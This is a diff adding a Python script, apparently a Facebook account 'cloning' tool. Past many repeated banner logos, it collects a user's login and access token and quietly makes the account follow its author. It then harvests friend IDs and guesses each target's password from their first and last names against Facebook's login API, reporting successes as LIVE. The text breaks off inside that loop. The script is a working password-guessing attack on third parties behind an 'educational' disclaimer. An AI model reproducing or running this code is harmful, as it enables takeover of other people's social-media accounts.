+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo12 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo13 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo14 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo15 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo16 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo17 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo18 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo19 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo20 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo21 = """	
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo22 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo23 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo24 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+logo25 = """
+\033[1;92m
+\033[1;93m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;92m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;93m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;92m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;93m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;92m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+
+\033[1;93m---------------------Yousuf---------------------
+
+\033[1;92mCreater      : \033[1;92mYousufAlzadjali
+\033[1;93mFacebook: \033[1;93mMuhammadYousuf
+\033[1;92mYoutube  : \033[1;92mhttps://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A
+\033[1;93mIts Not A Name Its Brand \033[1;93mYOUSUF
+\033[1;92mDISCLAIMRR :- This Tool Is only for Educational Purposes I am not responsible for any miss use
+
+\033[1;93m-----------------Yousuf-------------------------
+"""
+
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\x1b[1;91mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
+berhasil = []
+cekpoint = []
+oks = []
+id = []
+listgrup = []
+gagal = []
+idfriends = []
+idfromfriends = []
+idmem = []
+em = []
+emfromfriends = []
+hp = []
+hpfromfriends = []
+reaksi = []
+reaksigrup = []
+komen = []
+komengrup = []
+listgrup = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+os.system("clear")
+print  """
+
+\033[1;92m======================================
+
+\033[1;92m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+\033[1;93m▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
+\033[1;92m▒▒█▒▒▒▄██████████▄▒▒▒▒
+\033[1;93m▒█▐▒▒▒████████████▒▒▒▒
+\033[1;92m▒▌▐▒▒██▄▀██████▀▄██▒▒▒
+\033[1;93m▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
+\033[1;92m▐┼▐▒▒██████████████▒▒▒
+\033[1;93m▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
+\033[1;92m▒▒█████──────────▐███▌
+\033[1;93m▒▒█▀▀██▄█─▄───▐─▄███▀▒
+\033[1;92m▒▒█▒▒███████▄██████▒▒▒
+\033[1;93m▒▒▒▒▒██████████████▒▒▒
+\033[1;92m▒▒▒▒▒██████████████▒▒▒
+\033[1;93m▒▒▒▒▒█████████▐▌██▌▒▒▒
+\033[1;92m▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
+\033[1;93m▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
+\033[1;92m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+
+
+\033[1;92m╭╮╱╱╭╮╱╱╱╱╱╱╱╱╱╱╱╭━╮
+\033[1;93m┃╰╮╭╯┃╱╱╱╱╱╱╱╱╱╱╱┃╭╯
+\033[1;92m╰╮╰╯╭┻━┳╮╭┳━━┳╮╭┳╯╰╮
+\033[1;93m╱╰╮╭┫╭╮┃┃┃┃━━┫┃┃┣╮╭╯
+\033[1;92m╱╱┃┃┃╰╯┃╰╯┣━━┃╰╯┃┃┃
+\033[1;93m╱╱╰╯╰━━┻━━┻━━┻━━╯╰╯
+\033[1;92m-------------------
+
+"""
+
+CorrectUsername = "Yousuf"
+CorrectPassword = "WeLoveYou"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;97m\x1b[1;97mTool Username \x1b[1;97m------- \x1b[1;93m")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;97m\x1b[1;97mTool Password  \x1b[1;97m------- \x1b[1;93m")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username #Dev:qaiser
+	    time.sleep(2)
+            loop = 'false'
+        else:
+            print "\033[1;91mWrong Password"
+            os.system('xdg-open https://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A')
+    else:
+        print "\033[1;91mWrong Username"
+        os.system('xdg-open https://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A')
+
+##### LICENSE #####
+#=================#
+def lisensi():
+	os.system('clear')
+	login()
+	####login#########
+def login():
+	os.system('clear')
+	print 42*"\033[1;97m="
+	print "\033[1;93m>>>\033[1;93m[1]\033[1;93m Login with Facebook  "
+        time.sleep(0.05)
+        print "\033[1;92m>>>\033[1;92m[2]\033[1;92m Login with access token "
+        time.sleep(0.05)
+        print "\033[1;93m>>>\033[1;93m[3]\033[1;93m Download Access token"
+	time.sleep(0.05)
+	print "\033[1;92m>>>\033[1;92m[0]\033[1;92m Logout        "
+        print 42*"\033[1;97m="
+	pilih_login()
+
+def pilih_login():
+	peak = raw_input("\n\033[1;97mChoose an Option═╬══►\033[1;92m")
+	if peak =="":
+		print "\x1b[1;92mFill in correctly"
+		pilih_login()
+	elif peak =="1":
+		login1()
+        elif peak =="2":
+	        tokenz()
+        elif peak =="3":
+	        os.system('xdg-open https://play.google.com/store/apps/details?id=com.proit.thaison.getaccesstokenfacebook')
+	        login()
+	elif unikers =="0":
+		jalan('Token Removed')
+		os.system('rm -rf login.txt')
+		keluar()
+	else:
+		print "\x1b[1;92mFill in correctly"
+		pilih()
+			
+			
+def login1():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+                time.sleep(0.05)
+		print logo
+		print 42*"\033[1;97m="
+		jalan('\033[1;93m[✾]\x1b[1;93m DO NOT USE OLD ACCOUNT TO LOGIN\x1b[1;93m[✾]' )
+		jalan('\033[1;92m[✾]\x1b[1;92m USE A FRESH/NEW ACCOUNT TO LOGIN\x1b[1;92m[✾]' )
+		id = raw_input('\033[1;93m[!!] \x1b[0;33mID/Email \x1b[1;93m: \x1b[1;93m')
+		pwd = raw_input('\033[1;92m[!!] \x1b[0;32mPassword \x1b[1;92m: \x1b[1;92m')
+		print 42*"\033[1;97m="
+		tik()
 		try:
-		    q = requests.get("https://graph.facebook.com/"+uid+"?access_token="+token, headers=header).text
-		    d=json.loads(q)
-		    y=d['birthday']
-		    print("\033[1;32m "+uid+" \033[1;30m "+name+" | "+y+"\033[0;97m")
-		    nmb=open("dobs.txt","a")
-		    nmb.write(name+' | '+uid+" | "+y+"\n")
-		    nmb.close()
-		    nms.append(number)
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\x1b[1;92mThere is no internet connection"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				jalan( '\n\x1b[1;92mLogin Successful...') 
+				os.system('xdg-open https://www.youtube.com/channel/UCGEzNlT-HNPnVtAvUSJAY-A')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\x1b[1;92mThere is no internet connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\x1b[1;92mCHECK YOUR ACCOUNT IS CHECKPOINT")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\x1b[1;92mPassword/Email is wrong")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
+
+def tokenz():
+	os.system('clear')
+	print logo
+	print 42*"="
+	toket = raw_input("\033[1;91m[+]\033[1;92m Give Token\033[1;91m :\033[1;95>>\033[1;93m ")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		zedd = open("login.txt", 'w')
+		zedd.write(toket)
+		zedd.close()
+		menu()
+	except KeyError:
+		print "\033[1;91m[!] Wrong"
+		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		if e =="":
+			keluar()
+		elif e =="y":
+			login()
+		else:
+			keluar()
+			
+def menu():
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		os.system('clear')
+		print"\x1b[1;94mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(o.text)
+		nama = a['name']
+		id = a['id']
+                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
+                b = json.loads(t.text)
+                sub = str(b['summary']['total_count'])
+	except KeyError:
+		os.system('clear')
+		print"\033[1;92mYour Account is on Checkpoint"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\x1b[1;94mThere is no internet connection"
+		keluar()
+	os.system("clear")
+	print logo
+	print "   \033[1;33;92m☘■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■▣■■▣▣■■▣☘"
+	print "   \033[1;36;40m\033[1;32;40m[*] Name\033[1;32;92m: "+nama+"  	   \033[1;36;40m"                               
+	print "   \033[1;36;40m\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;92m"
+	print "   \033[1;36;40m\033[1;34;40m[*] Subs\033[1;34;92m: "+sub+"                      \033[1;36;92m"
+	print "   \033[1;33;92m☘■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■■▣■▣■■▣▣■■▣☘"
+	print "\033[1;32;98m[1] \033[1;33;98m☠️ Let's start Cloning"																														
+	print "\033[1;32;98m[0] \033[1;33;98m☠️ Log out"
+	pilih()
+
+def pilih():
+	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
+	if unikers =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih()
+	elif unikers =="1":
+		super()
+	elif unikers =="2":
+		os.system('clear')
+		print logo
+		print " \033[1;33;98m✨⚝░░░░░░░░░░░░☠️☠️░░░░░░░░░░░⚝✨\n"
+		os.system('git pull origin master')
+		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+		menu()
+	elif unikers =="0":
+		jalan('Token Removed')
+		os.system('rm -rf login.txt')
+		keluar()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih()
+
+def super():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\x1b[1;91mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	os.system('clear')
+	print logo
+	print "\x1b[1;32;93m[1] \033[1;33;93m👉 ☠️Attack From Friend List"
+	print "\x1b[1;32;93m[2] \033[1;33;93m👉 ☠️Attack From Public ID"
+	print "\x1b[1;32;93m[3] \033[1;33;93m👉 ☠️Attack From File"
+	print "\x1b[1;32;33m[0] \033[1;33;93m‼️Back"
+	pilih_super()
+
+def pilih_super():
+	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
+	if peak =="":
+		print "\x1b[1;91mFill in correctly"
+		pilih_super()
+	elif peak =="1":
+		os.system('clear')
+		print logo
+
+		jalan('\033[1;92m[♥️] Getting IDs ✔️ \033[1;98m.')
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+
+	elif peak =="2":
+		os.system('clear')
+		print logo
+		idt = raw_input("\033[1;93m[*] Enter ID : ")
+		try:
+			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			op = json.loads(jok.text)
+			print"\033[1;31;32m[🌀] Name : "+op["name"]
+		except KeyError:
+			print"\x1b[1;33m[🌀] ID Not Found!"
+			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
+			super()
+		print"\033[1;35;32m[🌀] Getting ID "
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif peak =="3":
+		os.system('clear')
+		print logo
+		brute()	
+	elif peak =="4":
+		os.system('clear')
+		print logo                  
+		try:
+			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
+			for line in open(idlist,'r').readlines():
+				id.append(line.strip())
+		except IOError:
+			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
+			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
+			super()
+	elif peak =="0":
+		menu()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih_super()
+
+	
+	print "\033[1;32;92m[⚒️] Total IDs : \033[1;93m"+str(len(id))
+	jalan('\033[1;33;93m[⚒️] Please Wait ▶️')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;32;40m[🏵️] Cloning\033[1;92m"+o),;sys.stdout.flush();time.sleep(1)
+	print "\n\033[1;93m        🔲     \x1b[1;93mYOUSUF To Stop Process Press CTRL+Z \033[1;93m    🔲"
+	print "   \033[1;31;92m★══════════════════════════════════★"
+
+	jalan('              \033[1;93mCP ACCOUNT OPEN AFTER 15 DAYS')
+	print  "  \033[1;32;92m ★══════════════════════════════════★" 
+
+       
+	
+	
+	def main(arg):
+		global cekpoint,oks
+		user = arg
+		try:
+			os.mkdir('out')
+		except OSError:
+			pass #Dev:Yousuf
+		try:
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
+			b = json.loads(a.text)												
+			pass1 = b['first_name'] + b['last_name']											
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
+			q = json.load(data)												
+			if 'access_token' in q:
+				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
+				z = json.loads(x.text)
+				print '\x1b[1;92m[  ✓  ] \x1b[1;92m[LIVE]'											
